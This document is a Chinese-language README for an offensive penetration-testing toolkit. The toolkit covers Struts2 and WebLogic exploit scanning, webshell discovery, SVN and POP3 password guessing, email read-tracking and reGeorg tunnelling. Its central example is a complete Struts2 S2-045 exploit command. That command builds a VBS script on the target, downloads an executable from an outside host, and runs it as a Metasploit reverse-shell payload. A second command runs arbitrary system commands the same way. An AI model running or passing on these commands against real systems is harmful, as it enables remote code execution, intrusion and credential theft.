本工具以mac os x 10.12.5的环境
# 巅狼安全 团队倾情奉献
```

Usage: checkUrl [options]


  Options:

    -V, --version           output the version number
    -u, --url [value]       check url, no default
    -p, --proxy [value]     http proxy,eg: http://127.0.0.1:8080, or https://127.0.0.1:8080, no default，设置代理
    -t, --t3 [value]        check weblogic t3,default false，对T3协议进行检测，可以指定文件名列表进行检测
    -i, --install           install node modules,run: npm install
    -v, --verbose           show logs
    -w, --struts2 [value]   struts2 type,eg: 045
    -C, --cmd [value]       cmd type,eg: "ping -c 3 www.baidu.com"
    -o, --timeout           default 5000
    -l, --pool              default 100
    -r, --test              test
    -m, --menu [value]      scan url + menus, default ./urls/ta3menu.txt
    -s, --webshell [value]  scan webshell url，设置参数才会运行, default ./urls/webshell.txt
    -d, --method [value]    default PUT,DELETE,OPTIONS,HEAD,PATCH test
    -a, --host              host attack test,设置代理后该项功能可能无法使用,default true
    -k, --keys [value]      scan html keywords, default ./urls/keywords
    -h, --help              output usage information

tomcat Put test
Struts2_001
Struts2_005
Struts2_007
Struts2_008
Struts2_009
Struts2_012
Struts2_013
Struts2_015
Struts2_016
Struts2_019
Struts2_020
Struts2_029
Struts2_032
Struts2_033
Struts2_037
Struts2_DevMode
Struts2_045
Struts2_046
Struts2_048
Struts2_053
elasticsearch
伪造host等检测

# 利用struts2 045漏洞，下载metasploit反弹程序并执行，以下在一行中
node checkUrl.js -u http://192.168.10.115:8080/ --struts2 045 --cmd 'del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.15:8080/Love.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'

node checkUrl.js -u http://192.168.10.15:8080/ --struts2 045 --cmd 'tasklist -svc'

# 批量开放T3检测，txt中可以放url
node checkUrl.js --t3 checkT3hostsUrlsFile.txt
# 常见webshell和url扫描
node checkUrl.js -s ./urls/webshell.txt -m ./urls/ta3menu.txt -u http://192.168.10.115:8080/

# T3协议漏洞的检测和利用
java -jar jfxl.jar 192.168.19.30:7001

# 指定一个网段的扫描
java -jar jfxl.jar 192.168.19.30-255:7001

# 目录、文件中文本文件字符集批量转换为utf-8
# 后渗透后得到很多win的数据txt文件，字符集gbk批量转换为utf8
node gbk2utf8.js fileOrDirName

# 多种解码
node decode.js base64等格式字符串

# eml 文件批量读取、转换
node emlToFileToos.js /Volumes/MyWork/eml /Volumes/MyWork/eml_data

# 手工XSS、渗透时需要的一些常用编码、解码
open strDecodeEncode.html

# 获取图片中的元数据（经纬度、创建时间）
node getFileMetadata.js yourJpgFile.jpg

# jndi内网无密码访问漏洞测试
java -jar ./JNDI_TEST/JNDITEST.jar

# weblogic中间件T3漏洞扫描
编辑ip.txt
python ./weblogic.py

# 二维码解码
node QrCodeDecode.js Haiios.jpg

# svn 弱密码检测 2017-01-22 M.T.X
node checkSvn.js http://18.12.88.10:8090/svn/ userName Pswd

# 信箱默认密码测试
node testPop3.js 12.171.20.20 110 mytels.txt

# http代理，有时候需要一个二级代理，来获得、修改一些数据
# 动态代理，每次自动随机使用代理
node proxy/ProxyServer.js
or
pm2 start ProxyServer.js -i max

# 更新代理 autoProxy.txt

node checkProxy.js
cat autoProxy.txt|sort|uniq >ok.txt
mv ok.txt autoProxy.txt
cat autoProxy.txt|wc -l

# 提取目录、文件，包含二进制文件中 ip信息
# 被入侵后，查看整个目录中所有ip信息，包含bin，可自行文件中的ip信息
node getIps.js fileOrDir

# 发送无跟踪邮件
sendmail.js  内容自行修改
邮件跟踪功能，当对方阅读后，能够从http://23.105.209.65/获取到阅读邮件的ip、user-agent等信息
proxychains4 -f ~/pc.conf  node sendmail.js 

# 某种js压缩后的解码、压缩编码, win下运行
压缩.hta

# 连接http隧道
python reGeorgSocksProxy.py -l 127.0.0.1 -p 8080 -u http://11.22.10.10:8070/ip/x.jsp

```

# 一些常用的防火墙，禁ping、nmap
``` 
iptablesSh.sh
iptablesSh.sh
``` 

# 依赖
<pre>
<code>

$ node -v
v8.1.2
$ls -ld /usr/local/lib/node_modules/* | awk '{print $9}'|sed -e 's/\/usr\/local\/lib\/node_modules\///g'
安装组件
npm install -g commander
安装需要的组件
node checkUrl.js -i

....
</code>

# 安装
brew install node
mkdir ~/safe && cd ~/safe
git clone https://github.com/hktalent/weblogic_java_des  mtx_jfxl

myhktools
</pre>